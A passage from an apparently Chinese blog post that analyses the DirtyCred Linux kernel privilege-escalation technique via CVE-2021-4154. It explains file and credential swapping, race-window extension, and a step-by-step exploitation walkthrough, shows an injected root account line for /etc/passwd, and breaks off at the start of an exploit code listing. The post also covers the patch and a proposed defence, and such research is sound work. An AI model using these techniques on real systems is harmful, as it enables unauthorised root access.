data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221007220556314.png"></p><p>如上图所示，DirtyCred首先打开一个可写文件<code>/tmp/x</code>，这会在内核中分配一个可写文件对象。通过触发漏洞，结构体中的指针被改为指向对应缓存中的文件对象。接着，DirtyCred尝试向打开的文件<code>/tmp/x</code>写入内容。在实际写入内容之前，Linux内核会检查当前文件是否有写权限、位置是否可写等。通过这些内核检查后，DirtyCred继续执行文件写入操作，并进入下一步。在这一步中，DirtyCred通过触发<code>fs_context</code>的释放操作来释放文件对象，使得该文件对象成为一个已释放的内存块。然后，在第三步中，DirtyCred打开一个只读文件<code>/etc/passwd</code>，这导致内核为<code>/etc/passwd</code>分配一个文件对象。如图所示，新分配的文件对象被放置在之前释放的内存块中。此后，DirtyCred继续之前的写操作，内核将执行实际的内容写入。由于文件对象已经被交换，所以原本要写入的内容现在将重定向到只读文件<code>/etc/passwd</code>中。如果写入<code>/etc/passwd</code>的内容是<code>hacker:x:0:0:root:/:/bin/sh</code>，那么攻击者可以通过这种方式注入一个root账户，从而实现提权。</p><p>简而言之，攻击者在权限检查和数据写入之间进行竞争。在成功检查文件权限（<code>/tmp/x</code><strong>可写</strong>）之后，触发漏洞恶意释放原先的<code>credential</code>结构体（这里是<code>file</code>结构体），并创建<strong>高权限</strong>的<code>credential</code>结构体（例如<code>/etc/passwd</code>的<code>file</code>结构体）来占据这个内存块，使得待写入的数据被写入<code>/etc/passwd</code>中，造成本地提权。</p><p>漏洞修补：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c</span><br><span class="hljs-comment">index ee93b6e895874..527917c0b30be 100644</span><br><span class="hljs-comment">--- a/kernel/cgroup/cgroup-v1.c</span><br><span class="hljs-comment">+++ b/kernel/cgroup/cgroup-v1.c</span><br><span class="hljs-meta">@@ -912,6 +912,8 @@</span> int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)<br>    opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br>    if (opt == -ENOPARAM) &#123;<br>        if (strcmp(param-&gt;key, &quot;source&quot;) == 0) &#123;<br><span class="hljs-addition">+            if (param-&gt;type != fs_value_is_string)</span><br><span class="hljs-addition">+                return invalf(fc, &quot;Non-string source&quot;);</span><br>            if (fc-&gt;source)<br>                return invalf(fc, &quot;Multiple sources not supported&quot;);<br>            fc-&gt;source = param-&gt;string;<br></code></pre></td></tr></table></figure><p>如上所示，DirtyCred不仅限于利用<code>file</code>对象。攻击者也可以使用类似的技术来交换凭据（<code>cred</code>），从而实现提权。</p><p>依据CVE-2021-4154的利用案例，DirtyCred本身不修改控制流，而是利用内核的内存管理特性来操作内存中的对象。因此，许多旨在防止控制流篡改的现有防御措施对于DirtyCred的利用无效。尽管最近一些研究工作尝试通过重新设计内存管理机制（例如AUTOSLAB）来增强内核的防御，但它们仍然无法阻止DirtyCred的利用，因为这些新提出的内存管理方案仍然是粗粒度的，无法有效阻止所需的内存操作。</p><h1 id="技术挑战">技术挑战</h1><p>虽然上述示例展示了DirtyCred如何实现提权的过程，但在实际应用中还存在许多技术难题需要解决。</p><p>DirtyCred的核心在于能够非法释放一个低特权对象（如具有写权限的文件对象），并重新分配为一个高特权对象（例如，具有只读权限的文件对象）。然而，并不是所有内核漏洞都直接提供这样的能力。有的漏洞可能仅允许越界写入，而不支持直接对凭据对象进行非法释放。因此，对于不同类型的漏洞，DirtyCred需要设计不同的策略来进行利用。</p><p>在权限检查完成之后和文件对象交换之前，DirtyCred需要保证真实文件写入的有效性。但在Linux内核中，权限检查与实际内容的写入是并行进行的。若没有有效控制文件对象交换的具体时机的方案，利用的难度将大幅增加。因此，DirtyCred需要一系列的机制，确保在恰当的时间窗口内完成文件对象的交换。</p><p>其中一个关键挑战是如何使用高特权凭证替换掉低特权凭证。为此，DirtyCred在释放的内存块中分配高特权对象以接管该内存。但低权限用户分配高权限凭据并非易事。虽然简单地等待特权用户自行分配可能在某些情况下可行，但这种被动策略严重影响了利用的稳定性。首先，DirtyCred无法预知何时可以回收所需的内存块以继续利用；其次，新分配的对象可能并不具备所需的特权级别。因此，DirtyCred需要结合用户空间和内核空间的策略来解决这一问题。</p><h1 id="pivoting-vulnerability-capability">PIVOTING VULNERABILITY CAPABILITY</h1><p>以CVE-2021-4154为例，内核漏洞为DirtyCred提供了非法释放文件对象的能力。然而在实际中，其他内核漏洞可能没有这种直接能力。例如，double-free或use-after-free(UAF)漏洞可能不直接针对凭证对象。而一些越界访问(OOB)漏洞没有非法释放的能力。因此，DirtyCred需要调整其利用链以适应不同类型的漏洞。</p><h2 id="pivoting-oob-uaf-write">Pivoting OOB &amp; UAF Write</h2><p>对于具有内存覆盖能力的OOB或UAF漏洞，DirtyCred首先寻找在内存中相邻且包含指向cred对象指针的可利用结构体。接着，利用SLAKE或其他堆喷技术在覆盖发生的内存区域分配目标对象。如下图所示，为了利用OOB漏洞，目标结构体需要紧跟在可控对象之后。DirtyCred通过越界写修改结构体中包含的<code>cred</code>指针，具体而言，是将<code>cred</code>指针的低两个字节置零。</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221007234651485.png"></p><p>由于Linux内核中的内存是按页管理的，且内存页地址始终以0x1000字节对齐，新缓存分配的对象通常从内存页的起始位置开始。因此，通过覆写的零字节操作，使得指针指向内存页的起始处。例如，在图(b)中，将凭证对象引用的指针的最后两个字节置零后，该指针将指向另一个凭证对象所在的内存页的起始。这样，DirtyCred通过修改指针，获取到了新内存页第一个对象的非法引用。利用内核正常释放对象内存和保留野指针的特性，DirtyCred可以通过堆喷技术用高特权凭证对象占据释放的位置，实现提权。</p><ul><li>如果UAF发生在<code>credential dedicated cache</code>上，只需释放原有的<code>unprivileged credential</code>，并用新创建的<code>privileged credential</code>对象占据该内存块即可完成替换。</li><li>如果UAF发生在<code>generic cache</code>上（更常见的情况），则要求该UAF漏洞具有<code>invalid-write</code>的能力。即先释放一个内存块，利用带有<code>credential pointer</code>的可利用对象占据该内存块，再通过UAF野指针修改这个<code>credential pointer</code>。</li></ul><h2 id="pivoting-double-free">Pivoting Double Free</h2><p>Double Free漏洞的利用相对更为复杂：</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404193234339.png"></p><p>利用流程如下：</p><ol type="1"><li>在受影响对象所在的缓存中大量分配对象，使其释放时机可控且至少占用一个内存页。这样做的目的是让某个内存页的回收时机可控，因为如果该页上的所有对象都被释放，则该空闲页会被回收。</li><li>尝试触发两次double free漏洞，以在一个被释放的内存块上留下两个悬挂指针。</li><li>释放该受影响对象所在内存页上的所有对象，使该页被回收并用于<code>credential</code>的内存分配，成为专用缓存。</li><li>在这个现已成为<code>credential dedicated cache</code>的内存页上大量分配<code>credential</code>结构体，以占满该页内存。</li><li>注意到两个悬挂指针可能不与<code>credential object</code>对齐，需要利用其中一个悬挂指针来释放出一个<code>credential object</code>的内存块。</li><li>分配新的<code>credential object</code>来占据这个内存块，这样就实现了两个指针同时指向一个<code>credential object</code>，后续的利用可以参考UAF的方式。</li></ol><h1 id="延长竞争窗口">延长竞争窗口</h1><p>Dirty Cred的核心挑战之一是在进行文件写权限检查和实际写入数据之间，成功地将低权限的credential替换为高权限credential。由于替换credential需要一定的时间，能够延长这个“竞争窗口”将大大提高漏洞利用的成功率。</p><p>在多线程程序中，<code>userfaultfd</code>允许一个线程管理其他线程产生的Page Fault事件。当某线程触发Page Fault时，它会立即进入休眠状态，而其他线程可以通过<code>userfaultfd</code>读取并处理这个Page Fault事件。</p><p><code>userfaultfd</code>经常被用于条件竞争漏洞的利用中。为了防止<code>userfaultfd</code>在内核漏洞利用中被滥用，从内核5.11版本开始，非特权<code>userfaultfd</code>默认是禁用的（<a target="_blank" rel="noopener" href="https://lwn.net/Articles/819834/">LWN: Blocking userfaultfd() kernel-fault handling</a>）。</p><p>FUSE（Filesystem in Userspace）是一个用户层的文件系统框架，允许用户自定义文件系统。通过在该框架中注册handler来处理文件操作请求，可以在文件操作前执行handler来暂停内核执行，从而尽可能地延长时间窗口。</p><h2 id="userfaultfd利用方式">Userfaultfd利用方式</h2><p>在Linux 4.13版本之前，<code>writev</code>系统调用的实现如下所示：</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404193738756.png"></p><p>攻击者可以在权限检查完成后，在调用<code>import_iovec</code>时触发缺页错误，利用<code>userfaultfd</code>机制暂停内核执行。</p><p>但是，在Linux 4.13版本后，<code>import_iovec</code>函数调用被提前，如下所示：</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/0.png"></p><p>如果有进程对某个文件执行了超大量数据写入，那么另一个进程在对相同文件执行写操作时，将会等待<code>inode</code>锁的释放。实验表明，4GB数据的写入可以使后续进程等待数十秒（依赖于硬盘性能），因此这个<code>inode</code>锁也可以用来延长竞争窗口。</p><h1 id="分配特权对象">分配特权对象</h1><p>由于Dirty Cred极度需要控制特权credential对象的分配时机，如何控制这些对象的分配成为了关键。</p><p><strong>在用户层面</strong>，可以通过以下方法来分配特权credential：</p><ol type="1"><li>大量执行Set-UID程序（如<code>sudo</code>），或频繁创建特权级守护进程（如<code>sshd</code>），以此来创建特权credential结构体。</li><li>使用ReadOnly方式打开如<code>/etc/passwd</code>这类特权文件。</li></ol><p><strong>在内核层面</strong>，当内核创建新的kernel thread时，当前的kernel thread及其特权credential结构体会被复制。因此，只要找到稳定创建kernel thread的方法，Dirty Cred就能稳定地创建特权credential结构体。实现这一目标的方法包括：</p><ol type="1"><li>向kernel workqueue中填充大量任务，动态创建新的kernel thread来执行这些任务。</li><li>调用usermode helper（一种允许内核创建用户模式进程的机制）。最常见的应用场景是加载内核模块到内核空间中。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// kernel/kmod.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">call_modprobe</span><span class="hljs-params">(<span class="hljs-type">char</span> *module_name, <span class="hljs-type">int</span> wait)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess_info</span> *<span class="hljs-title">info</span>;</span><br> <span class="hljs-type">static</span> <span class="hljs-type">char</span> *envp[] = &#123;<br>     <span class="hljs-string">&quot;HOME=/&quot;</span>,<br>     <span class="hljs-string">&quot;TERM=linux&quot;</span>,<br>     <span class="hljs-string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,<br>     <span class="hljs-literal">NULL</span><br> &#125;;<br><br> <span class="hljs-type">char</span> **argv = kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span> *[<span class="hljs-number">5</span>]), GFP_KERNEL);<br> <span class="hljs-keyword">if</span> (!argv)<br>     <span class="hljs-keyword">goto</span> out;<br><br> module_name = kstrdup(module_name, GFP_KERNEL);<br> <span class="hljs-keyword">if</span> (!module_name)<br>     <span class="hljs-keyword">goto</span> free_argv;<br><br> argv[<span class="hljs-number">0</span>] = modprobe_path;<br> argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-q&quot;</span>;<br> argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;--&quot;</span>;<br> argv[<span class="hljs-number">3</span>] = module_name;  <span class="hljs-comment">/* 注意 free_modprobe_argv() */</span><br> argv[<span class="hljs-number">4</span>] = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// 调用usermode helper</span><br> info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,<br>                <span class="hljs-literal">NULL</span>, free_modprobe_argv, <span class="hljs-literal">NULL</span>);<br> <span class="hljs-keyword">if</span> (!info)<br>     <span class="hljs-keyword">goto</span> free_module_name;<br><br> <span class="hljs-keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);<br><br>free_module_name:<br> kfree(module_name);<br>free_argv:<br> kfree(argv);<br>out:<br> <span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br></code></pre></td></tr></table></figure><p>内核在<strong>加载内核模块</strong>时，会<strong>在内核层执行modprobe程序</strong>，以<strong>搜索标准安装路径下的目标驱动</strong>。</p><h1 id="evaluation">EVALUATION</h1><h2 id="可利用的内核对象">可利用的内核对象</h2><p>在Linux 5.16.15版本中，DirtyCred利用的前提是<strong>内核对象中必须包含credential对象</strong>，且<strong>可以控制这些对象在内核堆上的分配时机</strong>。</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404194225406.png"></p><p>分析结果如下：</p><ol type="1"><li>几乎每个generic cache都<strong>至少有两个</strong>可利用对象。</li><li>各个可利用对象中credential的偏移量差异较大，这为Dirty Cred的利用成功率提供了提升的可能性。<ul><li>特别是对于OOB（越界写）漏洞，可覆写的偏移量可能相差甚远。</li></ul></li><li>有五个可利用对象的credential相对偏移量为0，这意味着在内存破坏范围较小的情况下，Dirty Cred的利用成功率会更高。</li></ol><h2 id="满足评估条件的cve漏洞">满足评估条件的CVE漏洞</h2><p>评估标准包括：</p><ul><li>报告时间为2019年及以后的Linux内核漏洞。</li><li>能够在Linux堆上进行堆破坏。</li><li>触发条件不需要特定硬件支持。</li><li>能复现相应内核panic。</li></ul><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404194320812.png"></p><p>从上图可见，在所有缓解机制都启动的情况下，Dirty Cred的利用成功率为：<strong>16/24</strong>。其中：</p><ol type="1"><li>Double Free漏洞的利用成功率最高。</li><li>OOB漏洞中，有些案例因为OOB write发生在虚拟内存而非kmalloc分配的内存，因此不可利用。</li><li>UAF漏洞中，一些无法完成利用的案例是因为仅能进行UAF read，无法执行invalid-write；或者虽然可以执行invalid-write，但写入位置不在可利用对象的credential字段上。</li></ol><h1 id="dirty-cred防护">Dirty Cred防护</h1><p>Dirty Cred之所以能成功利用，核心原因在于内核的内存隔离是基于<strong>类型</strong>而非<strong>权限</strong>。</p><p>防护方法相对简单：将privileged credentials与其他unprivileged credentials隔离。</p><p>实现方式是使用<code>vzalloc/kvfree</code>函数在虚拟内存中创建与释放privileged credentials内存，从而实现privileged和unprivileged对象在memory cache中的隔离。</p><p>选择虚拟内存的原因：</p><ol type="1"><li>如果使用两个不同的kmalloc分配的memory cache，存在通过Linux内核重用机制将privileged和unprivileged所在页合并的风险，导致隔离失效。</li><li>虚拟内存区域内的内存是内核<strong>动态分配</strong>、<strong>虚拟连续</strong>的，位于VMALLOC_START至VMALLOC_END区域内，不会与直接映射的内存区域重叠。</li></ol><p>需要隔离的credential结构体包括：</p><ol type="1"><li>UID为<strong>GLOBAL_ROOT_UID</strong>的struct cred（privileged credentials）。</li><li>打开方式中带有<strong>可写</strong>权限的struct file（unprivileged credentials）。</li></ol><p>为何需要隔离这两种类型的结构体，是因为相比其他结构（非特权级UID或只读文件结构），它们的创建次数相对较少。</p><p>隔离在credential创建时就已确定，如果非特权cred结构体被原地提权（如通过<code>setuid/cap_setuid</code>），则内存隔离策略可能失效。因此，提出在<code>alter_cred_subscribers</code>函数执行时，在虚拟内存区域创建新的特权cred，而非原地修改。但这种防护策略的有效性可能取决于Linux未来的发展，如果开发出新的原地修改cred的方式，则此防护可能会失效，因此留待未来进一步研究。</p><h1 id="cve-2021-4154利用">CVE-2021-4154利用</h1><p>在线程1中打开一个执行“慢写”的可写文件，将大量数据写入文件。</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png"></p><p>此时在线程2中打开同一个文件准备进行写入恶意数据，通过权限检查后触发锁等待线程1</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.jpg"></p><p>线程3触发UAF: 此时文件还在使用，但引用数被置0，导致文件对象被free。</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.jpg"></p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png"></p><p>疯狂打开<code>/etc/passwd</code>等待特权文件结构替换释放的文件结构</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png"></p><p>线程2等待线程1解锁后，向特权文件写入恶意数据</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.jpg"></p><p>攻击成功</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png"></p><h1 id="exp">exp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;endian.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/uio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kcmp.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/capability.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">die</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> 